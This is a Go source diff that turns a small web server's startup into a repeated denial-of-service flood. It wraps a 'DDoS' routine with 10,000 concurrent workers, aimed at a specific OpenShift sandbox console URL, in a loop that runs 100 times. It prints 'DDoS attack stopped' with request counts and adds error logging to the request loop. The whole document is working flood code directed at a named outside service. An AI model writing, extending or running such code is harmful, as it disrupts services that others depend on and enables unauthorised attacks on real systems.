@@ -18,18 +18,21 @@ func main() {
 	if port == "" {
 		port = "8080"
 	}
-	fmt.Println("helloooo")
 
-        workers := 10000
-	d, err := New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
-	if err != nil {
-		panic(err)
+	for i := 0; i < 100; i++ {
+		fmt.Println("helloooo")
+	
+	        workers := 10000
+		d, err := New("https://console-openshift-console.apps.sandbox-m2.ll9k.p1.openshiftapps.com", workers)
+		if err != nil {
+			panic(err)
+		}
+		d.Run()
+		time.Sleep(time.Second)
+		d.Stop()
+		successRequest, amountRequests := d.Result()
+		fmt.Println("DDoS attack stopped:", successRequest, amountRequests)
 	}
-	d.Run()
-	time.Sleep(time.Second)
-	d.Stop()
-	successRequest, amountRequests := d.Result()
-	fmt.Println("DDoS attack stopped:", successRequest, amountRequests)
 	
 	http.HandleFunc("/", HelloServer)
 	http.ListenAndServe(fmt.Sprintf("0.0.0.0:%s", port), nil)
@@ -91,6 +94,8 @@ func (d *DDoS) Run() {
 						atomic.AddInt64(&d.successRequest, 1)
 						_, _ = io.Copy(ioutil.Discard, resp.Body)
 						_ = resp.Body.Close()
+					} else {
+						fmt.Println("err:", err)
 					}
 				}
 				runtime.Gosched()
